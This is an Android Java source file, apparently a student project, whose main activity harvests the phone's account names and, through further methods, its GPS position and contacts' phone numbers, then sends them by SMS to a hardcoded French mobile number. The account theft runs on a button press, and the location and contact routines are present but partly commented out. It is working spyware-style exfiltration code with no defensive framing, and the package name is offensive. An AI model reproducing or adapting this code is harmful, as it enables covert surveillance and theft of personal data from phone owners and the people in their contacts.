package com.ingesup.pedobear;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Address;
import android.location.Criteria;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.lang.reflect.Method;
import java.util.ArrayList;


public class MainActivity extends ActionBarActivity {

    String position = " ";
    String account = " ";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button btAction = (Button) findViewById(R.id.button);
        String texte = "";


        btAction.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //TODO: Entrer les fonctions et les Scripts à executé
                //recupGPS();
                recupAccount();
                //planeMode();
            }
        });
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public void recupGPS(){
        LocationManager locationManager = (LocationManager)getSystemService( Context.LOCATION_SERVICE );
        Criteria criteria = new Criteria();
        criteria.setAccuracy( Criteria.ACCURACY_COARSE );
        String provider = locationManager.getBestProvider( criteria, true );

        if ( provider == null ) {
            System.out.println("Problème");
            return;
        }
        Location lastLocation = locationManager.getLastKnownLocation(provider);
        double latitude = lastLocation.getLatitude();
        double longitude = lastLocation.getLongitude();

        position = "Latitude :" + latitude + "\n" + "Longitude :" + longitude;
        sendSMS(position);
    }

    public void recupAccount(){
        Account[] lstAcc = AccountManager.get(getApplicationContext()).getAccounts();
        for(Account Acc : lstAcc){
            account = account + "Compte: " + Acc.name + System.getProperty("line.separator");
        }
        Log.d("TestAccount", account);
        sendSMS(account);
    }

    public void recupContactInfos() {
        ContentResolver cr = getContentResolver();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        Cursor cursor = cr.query(uri, null, null, null, null);
        String contactInfo ="";
        if (cursor.moveToFirst()) {
            String name ="";
            String phoneNumber = "";
            String workNumber = "";
            String homeNumber = "";
            String contactId =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            int nameColumn =
                    cursor.getColumnIndexOrThrow(ContactsContract.Data.DISPLAY_NAME);
            Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
            while (phones.moveToNext()) {
                String number = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                int type = phones.getInt(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                switch (type) {
                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                        homeNumber = number;
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                        phoneNumber = number;
                        break;
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                        workNumber = number;
                        break;



                }
                contactInfo = contactInfo+"Nom :"+name+"Numéro maison"+homeNumber+"Numéro portable :"+phoneNumber+"Numéro de travail :"+workNumber+"";
            }

        }
        sendSMS(contactInfo);
    }

    protected void sendSMS(String recipient) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> msg = smsManager.divideMessage(recipient);
            smsManager.sendMultipartTextMessage("+33676826908", null, msg, null, null);
            Toast.makeText(getApplicationContext(), "SMS Sent!",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(getApplicationContext(),
                    "SMS faild, please try again later!",
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }


    public void planeMode(){
        //Settings.Global.putInt(getApplicationContext().getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0);
    }

}